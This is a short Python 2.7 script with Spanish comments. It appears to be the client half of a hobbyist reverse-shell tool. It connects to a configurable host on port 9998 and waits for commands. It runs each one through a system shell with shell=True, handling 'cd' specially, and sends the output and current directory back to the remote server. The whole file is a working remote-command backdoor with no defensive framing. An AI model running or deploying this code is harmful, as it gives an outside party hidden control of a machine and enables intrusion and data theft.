'''
python 2.7.7 64 biuts
Creado por Samuel Caraballo Alias "sammas" jeje.©
Ultima actualizacion 4/11/2021

'''



import socket
import subprocess
import os

host = 'tuIP. --> ipconfig en Windows o ifconfig en Linux'
port = 9998 #PUERTO TIENE QUE SER IGUAL AL QUE SE PUSO EN EL SERVIDOR

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))
print "Conectado a traves del puerto: {}".format(port)
while True:# Espera a que el servidor mande instrucciones
    
    data = s.recv(1024) #Recibe el comando

    if data[:2].decode('utf-8') == 'cd':#Establece un caso especifico para cd.
        os.chdir(data[3:].decode('utf-8'))
        
        
    if len(data[:2].decode('utf-8')) > 0:#Si el comando no es 0
        proc = subprocess.Popen(data[:].decode('utf-8'),shell = True, stderr = subprocess.PIPE,
        stdout = subprocess.PIPE, stdin = subprocess.PIPE)# Llamada al sistea operativo
        byte_info = proc.stderr.read() + proc.stdout.read()#Ejecuta el comando
        string_info = str(byte_info)#Resultado del comando en lenguaje que podemos leer
        s.send(str.encode(string_info)+str(os.getcwd() + '> '))# Envia los resultados al servidor
        print string_info

s.close()
